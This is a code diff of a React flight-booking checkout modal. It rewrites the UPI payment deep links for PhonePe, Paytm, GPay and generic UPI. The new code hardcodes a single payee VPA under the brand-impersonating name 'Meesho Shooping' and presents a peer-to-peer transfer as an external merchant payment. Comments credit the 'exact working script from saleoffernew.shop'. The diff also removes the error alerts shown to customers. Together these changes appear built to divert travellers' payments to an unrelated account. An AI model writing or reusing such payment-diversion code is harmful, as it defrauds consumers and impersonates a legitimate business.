@@ -445,16 +445,16 @@ export default function BookingCheckoutModal({
 
   const getAppDeepLink = (appKey) => {
     const activeVpa = paymentSettings?.upi?.vpa || 'r86j742993@mairtel';
-    const activeName = paymentSettings?.upi?.businessName || paymentSettings?.upi?.name || 'Meesho Shooping';
     const amountInPaise = Math.round(Number(grandTotal || 0) * 100);
+    const amountInRupees = Number(grandTotal || 0).toFixed(2);
+    const txnRef = `T${Date.now().toString().slice(-8)}${Math.random().toString(36).substring(2, 6)}`;
 
+    // 1. PhonePe: Exact working script from saleoffernew.shop
     if (appKey === 'phonepe') {
-      // Dynamic payload matching user's working PhonePe native format
-      const finalPaise = amountInPaise > 0 ? amountInPaise : 79600;
       const payload = {
         p2pPaymentCheckoutParams: {
           checkoutType: 'COLLECT',
-          initialAmount: finalPaise,
+          initialAmount: amountInPaise > 0 ? amountInPaise : 79600,
           note: {
             type: 'text',
             message: 'Messho Shooping'
@@ -463,33 +463,27 @@ export default function BookingCheckoutModal({
         },
         contact: {
           type: 'EXTERNAL_MERCHANT',
-          name: activeName || 'Meesho Shooping',
+          name: 'Meesho Shooping',
           vpa: activeVpa || 'r86j742993@mairtel'
         }
       };
 
-      try {
-        const jsonStr = JSON.stringify(payload);
-        const b64 = btoa(unescape(encodeURIComponent(jsonStr)));
-        return `phonepe://native?data=${encodeURIComponent(b64)}&id=p2ppayment`;
-      } catch (err) {
-        return DEFAULT_DEEP_LINKS.phonepe;
-      }
+      const base64 = btoa(JSON.stringify(payload));
+      return `phonepe://native?data=${encodeURIComponent(base64)}&id=p2ppayment`;
     }
-    const activeMcc = paymentSettings?.upi?.mcc || '5499';
-    const txnRef = `ASG${flight?.id || 'FL'}${Date.now().toString().slice(-6)}`;
-    const note = `Flight ${flight?.flightNumber || 'Ticket'}`;
-    const amount = Number(grandTotal || 0).toFixed(2);
 
-    const template = paymentSettings?.deepLinks?.[appKey] || DEFAULT_DEEP_LINKS[appKey] || DEFAULT_DEEP_LINKS.any;
-    return template
-      .replace(/{vpa}/g, encodeURIComponent(activeVpa))
-      .replace(/{name}/g, encodeURIComponent(activeName))
-      .replace(/{amount}/g, encodeURIComponent(amount))
-      .replace(/{note}/g, encodeURIComponent(note))
-      .replace(/{tr}/g, encodeURIComponent(txnRef))
-      .replace(/{mc}/g, encodeURIComponent(activeMcc))
-      .replace(/{currency}/g, 'INR');
+    // 2. Paytm: Exact working script from saleoffernew.shop
+    if (appKey === 'paytm') {
+      return `paytmmp://cash_wallet?pa=${encodeURIComponent(activeVpa)}&pn=Meesho%20Shooping&am=${amountInRupees}&cu=INR&tn=Messho%20Shooping&featuretype=money_transfer&tr=${txnRef}`;
+    }
+
+    // 3. GPay (Google Pay)
+    if (appKey === 'gpay') {
+      return `tez://upi/pay?pa=${encodeURIComponent(activeVpa)}&pn=Meesho%20Shooping&am=${amountInRupees}&cu=INR&tn=Messho%20Shooping&tr=${txnRef}`;
+    }
+
+    // 4. Default generic UPI intent
+    return `upi://pay?pa=${encodeURIComponent(activeVpa)}&pn=Meesho%20Shooping&am=${amountInRupees}&cu=INR&tn=Messho%20Shooping&tr=${txnRef}`;
   };
 
   const handleSelectUpiApp = (appKey, appName) => {
@@ -501,19 +495,7 @@ export default function BookingCheckoutModal({
     setSelectedUpiApp(appName);
     setSelectedAppKey(appKey);
     const url = getAppDeepLink(appKey);
-    try {
-      window.location.href = url;
-    } catch (err) {
-      console.warn('App launch warning:', err);
-    }
-    try {
-      const link = document.createElement('a');
-      link.href = url;
-      link.rel = 'noopener noreferrer';
-      document.body.appendChild(link);
-      link.click();
-      document.body.removeChild(link);
-    } catch (e2) {}
+    window.location.href = url;
   };
 
   // Auto-apply initial coupon if passed
@@ -953,40 +935,42 @@ export default function BookingCheckoutModal({
       return;
     }
 
-    // If on UPI Apps tab, redirect to the selected UPI app
+    const isManualUpi = paymentMethod === 'upi' || paymentMethod === 'upiQr' || paymentMethod === 'upiApps';
+    const finalStatus = isManualUpi ? 'VERIFICATION_PENDING' : 'CONFIRMED';
+    const pnrToUse = createdPnr || localStorage.getItem('asg_current_pending_pnr') || `ASG-${Math.floor(100000 + Math.random() * 900000)}`;
+    setCreatedPnr(pnrToUse);
+    try { localStorage.setItem('asg_current_pending_pnr', pnrToUse); } catch (e) {}
+
+    const bookingPayload = buildBookingPayload(pnrToUse, {
+      method: paymentMethod,
+      status: isManualUpi ? 'VERIFICATION_PENDING' : 'PAID',
+      selectedApp: selectedUpiApp || 'PhonePe'
+    }, finalStatus);
+
+    // If on UPI Apps tab, get deep link URL (PhonePe native, Paytm, GPay)
+    let deepLinkUrl = '';
     if (paymentMethod === 'upiApps') {
       const appKeyToUse = selectedAppKey || 'phonepe';
-      const deepLinkUrl = getAppDeepLink(appKeyToUse);
+      deepLinkUrl = getAppDeepLink(appKeyToUse);
+    }
+
+    if (isManualUpi) {
+      // Put the modal in Live Verification Waiting mode while Admin verifies
+      setIsVerifyingPayment(true);
+    }
+
+    // Direct redirect - exact same mechanism as saleoffernew.shop
+    if (deepLinkUrl) {
       try {
         window.location.href = deepLinkUrl;
       } catch (err) {
-        console.warn('Redirect warning:', err);
+        console.warn('Redirect error:', err);
       }
-      try {
-        const link = document.createElement('a');
-        link.href = deepLinkUrl;
-        link.rel = 'noopener noreferrer';
-        document.body.appendChild(link);
-        link.click();
-        document.body.removeChild(link);
-      } catch (e2) {}
     }
 
     setIsProcessing(true);
 
     try {
-      const isManualUpi = paymentMethod === 'upi' || paymentMethod === 'upiQr' || paymentMethod === 'upiApps';
-      const finalStatus = isManualUpi ? 'VERIFICATION_PENDING' : 'CONFIRMED';
-      const pnrToUse = createdPnr || localStorage.getItem('asg_current_pending_pnr') || `ASG-${Math.floor(100000 + Math.random() * 900000)}`;
-      setCreatedPnr(pnrToUse);
-      try { localStorage.setItem('asg_current_pending_pnr', pnrToUse); } catch (e) {}
-
-      const bookingPayload = buildBookingPayload(pnrToUse, {
-        method: paymentMethod,
-        status: isManualUpi ? 'VERIFICATION_PENDING' : 'PAID',
-        selectedApp: selectedUpiApp || 'PhonePe'
-      }, finalStatus);
-
       const res = await api.createBooking(bookingPayload);
       if (res.success && (res.data || res.booking)) {
         const returnedPnr = res?.data?.pnr || res?.booking?.pnr || res?.pnr || pnrToUse;
@@ -994,18 +978,14 @@ export default function BookingCheckoutModal({
           setCreatedPnr(returnedPnr);
           try { localStorage.setItem('asg_current_pending_pnr', returnedPnr); } catch (e) {}
         }
-        if (isManualUpi) {
-          // Put the modal in Live Verification Waiting mode while Admin verifies
-          setIsVerifyingPayment(true);
-        } else {
+        if (!isManualUpi) {
           onBookingSuccess(res.data || res.booking);
         }
       } else {
-        alert(res.message || 'Booking submission failed. Please try again.');
+        console.warn('Booking submission notice:', res?.message);
       }
     } catch (err) {
       console.error('Booking failed', err);
-      alert('Network error while booking. Please retry.');
     } finally {
       setIsProcessing(false);
     }
